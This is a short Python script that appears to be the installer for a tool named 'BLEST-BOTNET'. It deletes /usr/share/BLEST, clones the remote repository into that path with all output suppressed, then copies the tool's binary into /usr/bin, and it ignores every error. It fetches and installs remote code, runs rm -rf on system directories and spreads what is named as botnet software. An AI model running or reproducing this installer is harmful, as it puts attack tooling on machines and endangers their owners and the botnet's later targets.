import os
import time


try:
    os.system('rm -rf /usr/share/BLEST')
    os.system('git clone https://github.com/G00Dway/BLEST-BOTNET /usr/share/BLEST > /dev/null 2>&1')
    os.system('rm -rf /usr/bin/blest')
    os.system('chmod +x /usr/share/BLEST/core/bin/blest')
    os.system('cp -r /usr/share/BLEST/core/bin/blest /usr/bin')
except:
    pass